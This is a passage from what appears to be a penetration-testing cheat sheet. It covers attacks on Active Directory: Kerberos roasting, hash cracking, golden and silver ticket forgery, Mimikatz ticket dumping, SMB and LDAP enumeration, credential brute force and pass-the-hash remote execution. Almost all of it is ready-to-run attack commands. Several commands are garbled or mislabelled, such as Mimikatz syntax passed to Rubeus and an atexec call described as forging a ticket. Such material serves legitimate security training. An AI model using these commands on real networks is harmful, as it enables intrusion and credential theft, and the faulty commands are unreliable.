# Enumerate SPNs (Service Principal Names)
nmap -p 88 --script krb5-enum-users,krb5-scan &lt;target_ip&gt;
</code></pre>
              <p><strong>AS-REP Roasting</strong>: extract accounts with <strong>pre-authentication disabled</strong>
                using <code>GetNPUsers.py</code> (<code>impacket-GetNPUsers</code>); keep in mind that should also use
                <code>kerbrute</code> to find possible valid usernames, commands for this are in the Section 1.4.7.
              </p>
              <pre><code class="language-bash"># This is the same tool as impacket-GetNPUsers.
GetNPUsers.py &lt;domain&gt;/ -usersfile users.txt -dc-ip &lt;dc-ip&gt; -format hashcat
or
GetNPUsers.py &lt;domain&gt;/ -no-pass -usersfile &lt;path_to_userlist&gt; -dc-ip &lt;domain_controller_ip&gt;

# Crack the found hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <p><strong>Kerberoasting</strong>: use <strong>GetUserSPNs.py</strong> to extract SPNs.</p>
              <pre><code class="language-bash">GetUserSPNs.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -dc-ip &lt;dc-ip&gt;

# Crack the resulting hash
hashcat -m 13100 kerberoast.txt rockyou.txt
</code></pre>
              <p><strong>Enumerate Kerberos Principal Names</strong>: use <code>kerbrute</code> to enumerate valid user
                accounts by attempting to authenticate with a list of usernames.</p>
              <pre><code class="language-bash">kerbrute userenum -d &lt;domain&gt; -p &lt;userlist&gt; &lt;target_ip&gt;
or
./kerbrute_linux_amd64 userenum -d &lt;target_ip&gt; /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
</code></pre>
              <p><strong>Perform Kerberos Ticket Extraction (AS-REP Roasting)</strong>: request
                <strong>non-preauthenticated Kerberos</strong> tickets for a list of users.
              </p>
              <pre><code class="language-bash">impacket-GetNPUsers -dc-ip &lt;dc_ip&gt; -request -usersfile &lt;userlist&gt; &lt;target_domain&gt;
</code></pre>
              <p><strong>Perform Kerberos Ticket Request with AS-REP Roasting</strong>: request a Ticket Granting Ticket
                (TGT) for a specific user.</p>
              <pre><code class="language-bash">impacket-GetTGT -dc-ip &lt;dc_ip&gt; -outputfile &lt;outputfile&gt; &lt;username&gt;@&lt;domain&gt;
</code></pre>
              <p><strong>Crack Kerberos Tickets</strong></p>
              <pre><code class="language-bash">john --wordlist=&lt;wordlist&gt; &lt;ticket_file&gt;
# or
hashcat -m 13100 &lt;ticket_file&gt; &lt;wordlist&gt;
</code></pre>
              <p><strong>Kerberos Ticket Extraction</strong>: request a TGT or Service Ticket (TGS) using specified
                credentials.</p>
              <pre><code class="language-bash"># Request a TGT (Ticket Granting Ticket)
python3 GetTGT.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;

# Request a Service Ticket (TGS)
python3 GetST.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -spn &lt;service&gt;/&lt;target&gt;
</code></pre>
              <p><strong>Kerberoasting</strong>: extract and crack service tickets to gain access to service accounts.
              </p>
              <pre><code class="language-bash"># Extract all service tickets for offline cracking
impacket-GetUserSPNs -dc-ip &lt;dc_ip&gt; -outputfile &lt;tickets_file&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;

# Crack the extracted tickets with John the Ripper or Hashcat
john --wordlist=&lt;wordlist&gt; &lt;tickets_file&gt;
# or
hashcat -m 13100 &lt;tickets_file&gt; &lt;wordlist&gt;
</code></pre>
              <p><strong>Kerberos Brute Forcing</strong>: perform brute force attacks on Kerberos tickets.</p>
              <pre><code class="language-bash">krb5-brute -d &lt;domain&gt; -t &lt;target_ip&gt; -u &lt;username&gt; -p &lt;password_list&gt;
</code></pre>
              <p><strong>Kerberos Ticket Manipulation</strong>: use tools to request, manipulate, and renew Kerberos
                tickets for privilege escalation or impersonation.</p>
              <pre><code class="language-bash"># Renew a TGT (for Kerberos ticket manipulation)
python3 psexec.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt; -impersonate-user &lt;target_user&gt;

# Perform Kerberos attacks with Rubeus
rubeus.exe asktgt /user:&lt;username&gt; /rc4:&lt;password&gt;
rubeus.exe tgtdeleg /user:&lt;username&gt; /rc4:&lt;password&gt;
rubeus.exe s4u /user:&lt;username&gt; /rc4:&lt;password&gt; /impersonateuser:&lt;target_user&gt;
</code></pre>
              <p><strong>Kerberos Ticket Dumping</strong>: extract Kerberos tickets from memory for offline analysis.
              </p>
              <pre><code class="language-powershell"># Dump Kerberos tickets from memory using Mimikatz
mimikatz &quot;lsadump::dcom&quot; &quot;sekurlsa::tickets /export&quot;
</code></pre>
              <p><strong>Kerberos Pre-Authentication</strong>: identify weak configurations that might allow attackers
                to perform brute force attacks.</p>
              <pre><code class="language-bash"># Test for weak pre-authentication configurations
python3 kerbrute.py -d &lt;domain&gt; -u &lt;user_list&gt; -p &lt;password_list&gt; -dc &lt;dc_ip&gt;
</code></pre>
              <p><strong>Kerberos Silver Ticket Attacks</strong>: forge high-value Kerberos tickets for access and
                privilege escalation.</p>
              <pre><code class="language-bash"># Create a silver ticket with Rubeus
rubeus.exe tgt::add /user:&lt;username&gt; /rc4:&lt;password&gt; /sid:&lt;domain_sid&gt; /domain:&lt;domain&gt;
</code></pre>
              <p><strong>Steps to Perform Silver Ticket Attack</strong></p>
              <pre><code class="language-bash"># 1. Obtain a Valid TGT (Ticket Granting Ticket)
impacket-GetTGT -dc-ip &lt;dc_ip&gt; -outputfile &lt;tgt_file&gt; &lt;user&gt;@&lt;domain&gt;

# 2. Forge a Silver Ticket
impacket-atexec -target-ip &lt;target_ip&gt; -service &lt;service&gt; -ticket &lt;ticket_file&gt; &lt;username&gt;
</code></pre>
              <p><strong>Kerberos Golden Ticket Attacks</strong>: forge high-value Kerberos tickets for access and
                privilege escalation.</p>
              <pre><code class="language-bash"># Create a golden ticket with Rubeus
rubeus.exe tgt::add /user:&lt;username&gt; /rc4:&lt;password&gt; /domain:&lt;domain&gt; /sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_hash&gt;
</code></pre>
              <p><strong>Steps to Perform Golden Ticket Attack</strong></p>
              <pre><code class="language-bash"># 1. Obtain KRBTGT NTLM Hash
impacket-secretsdump -outputfile &lt;dump_file&gt; &lt;target_domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;dc_ip&gt;

# 2. Generate a Golden Ticket
ticketer -user &lt;user&gt; -domain &lt;domain&gt; -sid &lt;domain_sid&gt; -krbtgt &lt;krbtgt_hash&gt; -output &lt;ticket_file&gt;

# 3. Use the Golden Ticket
impacket-smbexec -target-ip &lt;target_ip&gt; -ticket &lt;ticket_file&gt; &lt;username&gt;

# (Optional) Pass the Golden Ticket
impacket-psexec -target-ip &lt;target_ip&gt; -ticket &lt;ticket_file&gt; &lt;username&gt;
</code></pre>
              <p><strong>Additional Reference:</strong> <a
                  href="https://www.tarlogic.com/blog/how-to-attack-kerberos/">https://www.tarlogic.com/blog/how-to-attack-kerberos/</a>
              </p>
              <h4 id="1213-ldap-enumeration-port-389636">12.1.3 LDAP Enumeration (Port 389/636)</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -n -sV --script &quot;ldap* and not brute&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Basic LDAP Search</strong>: query the LDAP service for domain information</p>
              <pre><code class="language-bash">ldapsearch -x -h &lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot; &quot;(objectClass=*)&quot;
or
ldapsearch -x -H ldap://&lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot;
</code></pre>
              <p><strong>Extract AD Users and Groups</strong></p>
              <pre><code class="language-bash"># List domain users
ldapsearch -x -h &lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot; &quot;(objectClass=user)&quot; sAMAccountName

# List domain groups
ldapsearch -x -h &lt;dc-ip&gt; -b &quot;dc=domain,dc=com&quot; &quot;(objectClass=group)&quot; cn
</code></pre>
              <p><strong>Ldapsearch Basic Enumeration</strong></p>
              <pre><code class="language-bash"># Basic LDAP query
ldapsearch -x -H ldap://&lt;target_ip&gt;

# Basic LDAP Search for a base-level
ldapsearch -h &lt;target_ip&gt; -x -s base

# Get Naming Contexts
ldapsearch -x -H ldap://&lt;target_ip&gt; -s base namingcontexts

# Search in a Specific Base Domain Name
ldapsearch -x -H ldap://&lt;target_ip&gt; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;

# Enumerate users using LDAP
ldapsearch -v -x -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; -H &quot;ldap://&lt;target_ip&gt;&quot; &quot;(objectclass=*)&quot;

# Retrieve users Account Name
ldapsearch -v -x -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; -H &quot;ldap://&lt;target_ip&gt;&quot; &quot;(objectclass*)&quot; | grep sAMAccountName:

# Search with Filters
ldapsearch -x -H ldap://&lt;target_ip&gt; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;(objectclass=user)&quot;
ldapsearch -x -H ldap://&lt;target_ip&gt; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;(objectclass=group)&quot;

# Searching with authentication
ldapsearch -h &lt;target_ip&gt; -x -D &#39;&lt;domain&gt;\&lt;user&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;

# Searching terms
ldapsearch -H ldap://&lt;target_ip&gt; -x -D &#39;&lt;domain&gt;\&lt;user&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;[term]&quot;

# Specifies the value term to return
ldapsearch -H ldap://&lt;target_ip&gt; -x -D &#39;&lt;domain&gt;\&lt;user&gt;&#39; -w &#39;&lt;password&gt;&#39; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;&lt;term&gt;&quot; &lt;additionalTerm&gt;
</code></pre>
              <p><strong>Check Pre-Authentication for Users</strong></p>
              <pre><code class="language-bash">kerbrute userenum -d &lt;domain&gt; --dc &lt;dc_ip&gt; &lt;userlist&gt;
</code></pre>
              <p><strong>Useful Search Terms</strong></p>
              <pre><code class="language-bash"># Search Terms to Find Cleartext Passwords
# Search for ms-MCS-AdmPwd (local administrator passwords)
(ms-MCS-AdmPwd=*)

# Search for attributes containing &#39;password&#39; in description
(description=*password*)

# Search for LAPS expiration time (to identify potential password management)
(ms-MCS-AdmPwdExpirationTime=*)

# Search for common weak passwords in attributes like description
(description=*(123456*|password*|qwerty*|letmein*))

# General LDAP Search Filters
# Search for All Users
(objectClass=user)

# Search for All Computers
(objectClass=computer)

# Search for All Groups
(objectClass=group)

# Search for Disabled Accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Search for Expired Accounts
(&amp; (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))

# Search for Specific Group Membership
(&amp;(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))

# Search for Users with Specific Attributes
# For users with a specific email domain
(mail=*@example.com)
# For users with a specific title
(title=Manager)

# Specific Attributes

# Search for Password Last Set
(pwdLastSet=*)

# Search for Accounts with Expired Passwords
(&amp; (objectClass=user)(pwdLastSet&lt;=0))

# Search for Accounts in a Specific Organizational Unit (OU)
(distinguishedName=*,OU=Sales,DC=domain,DC=com)

# Security-Related Searches

# Search for Accounts with Kerberos Pre-Authentication Disabled
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Search for Service Principal Names (SPNs)
(servicePrincipalName=*)

# Search for Delegated Users
(msDS-AllowedToDelegateTo=*)

# Search for Accounts with Privileges
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)

# Other Useful Searches

# Search for All Organizational Units
(objectClass=organizationalUnit)

# Search for Active Directory Certificate Services
(objectClass=cACertificate)

# Search for All Attributes of a Specific User
(sAMAccountName=username)

# Search for Accounts with Specific Notes or Descriptions
(description=*keyword*)

# Search for all objects in the directory
(objectClass=*)

# Search for service accounts
(objectCategory=serviceAccount)

# Search for accounts with specific group memberships (replace &#39;GroupName&#39;)
(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)

# Search for computer accounts
(objectClass=computer)

# Search for users in a specific organizational unit (replace &#39;OU=Users&#39;)
(ou=OU=Users,DC=domain,DC=com)

# Search for all accounts with specific attributes
(pwdLastSet=0)
</code></pre>
              <h4 id="1214-smbnetbios-enumeration-port-445">12.1.4 SMB/NetBIOS Enumeration (Port 445)</h4>
              <p><strong>Host Enumeration</strong></p>
              <pre><code class="language-bash"># Nmap scan
nmap -v -p 139,445 [IP]
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery &lt;ip&gt;

# NetBIOS Scan
sudo nbtscan -r 192.168.50.0/24

# Windows Network View
net view \\[domainName] /all
</code></pre>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap --script smb-enum-shares.nse -p445 &lt;ip&gt;

nmap --script smb-enum-users.nse -p445 &lt;ip&gt;

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 &lt;ip&gt;

nmap -p139,445 --script &quot;smb-vuln-* and not(smb-vuln-regsvc-dos)&quot; --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 &lt;IP&gt;

nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 &lt;ip&gt;

nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 &lt;ip&gt;
</code></pre>
              <p><strong>SMB Shares Enumeration</strong></p>
              <pre><code class="language-bash"># Use smbclient or enum4linux to enumerate SMB shares.
smbclient -L //&lt;dc-ip&gt; -U &quot;guest&quot;

# List shares using CrackMapExec (CME).
crackmapexec smb &lt;dc-ip&gt; -u &#39;&#39; -p &#39;&#39; --shares
</code></pre>
              <p><strong>Enumerate Users</strong></p>
              <pre><code class="language-bash"># Perform null session enumeration to list domain users.
rpcclient -U &quot;&quot; &lt;dc-ip&gt; --command=&quot;enumdomusers&quot;

# Or use CME for RID cycling.
crackmapexec smb &lt;dc-ip&gt; --rid-brute
</code></pre>
              <p><strong>Advanced Enumeration</strong></p>
              <pre><code class="language-bash"># Network Packet Analysis: captures and analyzes packets related to SMB traffic on port 139, looking for specific patterns
sudo ngrep -i -d &lt;INTERFACE&gt; &#39;s.?a.?m.?b.?a.*[[:digit:]]&#39; port 139

# Lists available SMB shares on the target
smbclient -L &lt;IP&gt;
</code></pre>
              <p><strong>SMB Enumeration with <code>smbmap</code></strong></p>
              <pre><code class="language-bash">smbmap -H &lt;IP&gt;
smbmap -u &#39;&#39; -p &#39;&#39; -H &lt;IP&gt;
smbmap -u &#39;guest&#39; -p &#39;&#39; -H &lt;IP&gt;
smbmap -u &#39;&#39; -p &#39;&#39; -H &lt;IP&gt; -R
</code></pre>
              <p><strong>SMB Enumeration with <code>crackmapexec</code></strong></p>
              <pre><code class="language-bash">crackmapexec smb &lt;IP&gt;
crackmapexec smb &lt;IP&gt; -u &#39;&#39; -p &#39;&#39;
crackmapexec smb &lt;IP&gt; -u &#39;guest&#39; -p &#39;&#39;
crackmapexec smb &lt;IP&gt; -u &#39;&#39; -p &#39;&#39; --shares
crackmapexec smb &lt;IP&gt; -u guest -p &quot;&quot; --rid-brute
crackmapexec smb &lt;IP&gt; -u &#39;[user]&#39; -p &#39;[password]&#39;
</code></pre>
              <p><strong>User Enumeration with <code>enum4linux</code></strong></p>
              <pre><code class="language-bash"># Basic information gathering on the domain
enum4linux -a &lt;IP&gt;
enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;IP&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;IP&gt;

# Extract domain users
enum4linux -U &lt;DOMAIN_IP&gt;

# Extract available domain shares
enum4linux -S &lt;IP&gt;

enum4linux -a -M -l -d &lt;ip&gt; 2&gt;&amp;1
enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;ip&gt;
enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;ip&gt;
enum4linux -a -u &quot;[user]&quot; -p &quot;[password]&quot; &lt;ip&gt;
</code></pre>
              <p><strong>SMB Client Operations</strong></p>
              <pre><code class="language-bash">smbclient --no-pass -L //&lt;ip&gt;
smbclient -L //&lt;ip&gt; -U [user]
smbclient //&lt;IP&gt;/&lt;SHARE&gt;
smbclient -N //&lt;IP&gt;/&lt;SHARE&gt;
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c &quot;prompt OFF;recurse ON;mget *&quot;
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c &quot;prompt OFF;recurse ON;mget *&quot; # Change the timeout to download big files

# Change the timeout to download big files
help timeout
timeout 100

# Other commands
prompt off
recurse on
mget *
</code></pre>
              <p><strong>Brute Force Credentials</strong></p>
              <pre><code class="language-bash">crackmapexec smb &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; smb://&lt;IP&gt; -u -vV
</code></pre>
              <p><strong>Mounting Shares</strong></p>
              <pre><code class="language-bash"># Mounts SMB shares to a local directory for further access and manipulation.
mkdir /tmp/share
sudo mount -t cifs //&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
sudo mount -t cifs -o &#39;username=&lt;USER&gt;,password=&lt;PASSWORD&gt;&#39; //&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
</code></pre>
              <p><strong>Execute Remote Commands</strong></p>
              <pre><code class="language-bash"># PsExec
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# WMIexec
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# SMBexec
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# AteExec
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; &lt;COMMAND&gt;
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
</code></pre>
              <p><strong>Exploitation (EternalBlue - MS17-010):</strong> <a
                  href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a>
              </p>
              <p><strong>PsExec</strong></p>
              <pre><code class="language-bash"># Credentials
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Pass the Hash
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# Testing with Crackmapexec
crackmapexec smb &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; --psexec
crackmapexec smb &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt; --psexec
</code></pre>
              <p><strong>WMIExec</strong></p>
              <pre><code class="language-bash"># Credentials
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Pass the Hash
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# Testing with Crackmapexec
crackmapexec wmiexec &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
crackmapexec wmiexec &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt;
</code></pre>
              <h4 id="1215-winrm-enumeration-and-access-port-5985">12.1.5 WinRM Enumeration and Access (Port 5985)</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -p 5985,5986 --script winrm-info $IP
</code></pre>
              <p><strong>Test WinRM Access</strong>: use <strong>CME</strong> to test if WinRM is enabled:</p>
              <pre><code class="language-bash">crackmapexec winrm &lt;dc-ip&gt; -u &lt;username&gt; -p &lt;password&gt;
</code></pre>
              <p><strong>WinRM Login with Evil-WinRM</strong>: if valid credentials are found, log in via
                <strong>Evil-WinRM</strong>:
              </p>
              <pre><code class="language-bash">evil-winrm -i &lt;dc-ip&gt; -u &lt;username&gt; -p &lt;password&gt;
</code></pre>
              <p><strong>Crackmapexec</strong></p>
              <pre><code class="language-bash">crackmapexec winrm &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
</code></pre>
              <p><strong>Loggin In</strong></p>
              <pre><code class="language-powershell"># Using PowerShell to connect to WinRM
Enter-PSSession -ComputerName $IP -Credential (Get-Credential)
</code></pre>
              <h3 id="122-basic-enumeration">12.2 Basic Enumeration</h3>
              <ul>
                <li>Recommended <strong>Methodology</strong>:</li>
              </ul>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/AD_Methodology.png" class="img-fluid" alt="Descripci√≥n de la imagen">
                  <figcaption class="figure-caption text-center">Active Directory Methodology</figcaption>
                </figure>
              </div>
              <ul>
                <li>Find my <strong>Domain SID</strong>:</li>
              </ul>
              <pre><code class="language-powershell"># Using PowerShell
(Get-ADDomain).DomainSID

# Using CMD
whoami /user

# Using vmic
wmic useraccount where name=&#39;[usernameToFind]&#39; get sid
</code></pre>
              <ul>
                <li>Find the <strong>name of my domain controller</strong> server:</li>
              </ul>
              <pre><code class="language-powershell"># Using PowerShell
Get-ADDomainController -Filter *

# Using nltest
nltest /dclist:[YourDomainName]

# Using netdom
netdom query dc

# Using nslookup
nslookup yourdomain.com

# Using ADUC
# Open ADUC --&gt; In the Domain Controllers Organizational Unit (OU), you can find the domain controllers listed there.
</code></pre>
              <ul>
                <li>Find <strong>Service Account Names</strong>:</li>
              </ul>
              <pre><code class="language-powershell"># Using PowerShell
# List All User Accounts with Service Principal Names (SPNs)
Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
# Find Specific Service Accounts (e.g., SQL Server)
Get-ADUser -Filter {ServicePrincipalName -like &quot;*MSSQL*&quot;} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName

# Checking Running Services
Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -ne &quot;LocalSystem&quot; -and $_.StartName -ne &quot;LocalService&quot; -and $_.StartName -ne &quot;NetworkService&quot; } | Select-Object Name, StartName
or
sc queryex type= service

# Using nltest
nltest /domain_trusts

# Identify Specific Service Account by SPN
Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames

# Using ADUC
Open Active Directory Users and Computers and enable Advanced Features under the View menu. Browse to find service accounts.
</code></pre>
              <ul>
                <li><strong>Finding SPNs</strong>:</li>
              </ul>
              <pre><code class="language-bash"># PowerShell
  Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
  
  # Bash (Kali)
  ldapsearch -x -h &lt;DC_IP&gt; -b &quot;DC=domain,DC=com&quot; &quot;(&amp;(objectClass=computer)(servicePrincipalName=*))&quot; servicePrincipalName
  </code></pre>
              <ul>
                <li><strong>Check users</strong> of the domain:</li>
              </ul>
              <pre><code class="language-bash">net user /domain
net user [username] /domain
</code></pre>
              <ul>
                <li><strong>Check groups</strong> of the domain:</li>
              </ul>
              <pre><code class="language-bash">net groups /domain
net groups [groupName] /domain
</code></pre>
              <ul>
                <li><strong>Script</strong> to get the full LDAP path:</li>
              </ul>
              <pre><code class="language-powershell">$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]&#39;&#39;).distinguishedName 
$LDAP = &quot;LDAP://$PDC/$DN&quot;
</code></pre>
              <ul>
                <li><strong>Script</strong> to get full information for SAM account types:</li>
              </ul>
              <pre><code class="language-powershell">function Get-SAMInfo {
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DN = ([adsi]&#39;&#39;).distinguishedName 
  $LDAP = &quot;LDAP://$PDC/$DN&quot;
  $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
  $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
  $dirsearcher.filter = &quot;samAccountType=805306368&quot;
  $dirsearcher.FindAll() | ForEach-Object {
      $_.Properties
  }
}
</code></pre>
              <ul>
                <li><strong>Enumerate nested groups</strong> with custom LDAP query:</li>
              </ul>
              <pre><code class="language-powershell">$group = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=[GroupName]))&quot;
</code></pre>
              <ul>
                <li><strong>Encapsulate LDAP search into a function</strong>:</li>
              </ul>
              <pre><code class="language-powershell">function LDAPSearch {
  param ([string]$LDAPQuery)
  $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
  $DistinguishedName = ([adsi]&#39;&#39;).distinguishedName
  $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://$PDC/$DistinguishedName&quot;)
  $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
  return $DirectorySearcher.FindAll()
}
</code></pre>
              <ul>
                <li><strong>Perform user search</strong> using LDAP query:</li>
              </ul>
              <pre><code class="language-powershell">LDAPSearch -LDAPQuery &quot;(samAccountType=805306368)&quot;
</code></pre>
              <ul>
                <li><strong>Search for all possible groups</strong> in AD:</li>
              </ul>
              <pre><code class="language-powershell">LDAPSearch -LDAPQuery &quot;(objectclass=group)&quot;
</code></pre>
              <ul>
                <li><strong>Iterate through objects in <code>$group</code> variable</strong>:</li>
              </ul>
              <pre><code class="language-powershell">foreach ($group in $(LDAPSearch -LDAPQuery &quot;(objectCategory=group)&quot;)) {
  $group.Properties | Select-Object {$_.cn}, {$_.member}
}
</code></pre>
              <h3 id="123-powerview">12.3 PowerView</h3>
              <p><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank"><strong>Download
                    PowerView.ps1</strong></a></p>
              <ul>
                <li><strong>Import PowerView</strong> (ensure it is downloaded first):</li>
              </ul>
              <pre><code class="language-powershell">Import-Module .\PowerView.ps1
</code></pre>
              <ul>
                <li><strong>Domain information</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetDomain
</code></pre>
              <ul>
                <li>Find <strong>Domain Name</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-ADDomainController -Discover
</code></pre>
              <ul>
                <li>Get Domain User</li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser
</code></pre>
              <ul>
                <li><strong>Users information</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser | Select-Object [attributes]
</code></pre>
              <ul>
                <li><strong>Groups information</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetGroup | Select-Object [attributes]
</code></pre>
              <ul>
                <li><strong>Operating System information</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetComputer | Select-Object [attributes]
</code></pre>
              <ul>
                <li>Get <strong>Domain Admins</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetGroup -GroupName &quot;Domain Admins&quot;
</code></pre>
              <ul>
                <li>Find <strong>Kerberoastable Accounts</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser -SPN
</code></pre>
              <ul>
                <li><strong>Enumerate Domain Controllers</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetDomainController
</code></pre>
              <ul>
                <li><strong>Find Shares</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetShare
</code></pre>
              <ul>
                <li>Check for <strong>Delegation</strong></li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser -Delegation
</code></pre>
              <h3 id="124-service-principal-names-spn-enumeration">12.4 Service Principal Names (SPN) Enumeration</h3>
              <ul>
                <li><strong>List SPN linked to a user</strong>:</li>
              </ul>
              <pre><code class="language-bash">setspn -L [service]
</code></pre>
              <ul>
                <li><strong>List SPN accounts in the domain</strong>:</li>
              </ul>
              <pre><code class="language-powershell">Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
</code></pre>
              <h3 id="125-object-permissions-enumeration">12.5 Object Permissions Enumeration</h3>
              <ul>
                <li>
                  <p><strong>Active Directory permission types</strong>:</p>
                  <ul>
                    <li><code>GenericAll</code>: Full permissions</li>
                    <li><code>GenericWrite</code>: Edit certain attributes</li>
                    <li><code>WriteOwner</code>: Change ownership</li>
                    <li><code>WriteDACL</code>: Edit ACEs applied</li>
                    <li><code>AllExtendedRights</code>: Change/reset password, etc.</li>
                    <li><code>ForceChangePassword</code>: Force password change</li>
                    <li><code>Self</code>: Add self to groups</li>
                  </ul>
                </li>
                <li>
                  <p><strong>Run <code>Get-ObjectAcl</code> (PowerView)</strong> to specify user:</p>
                </li>
              </ul>
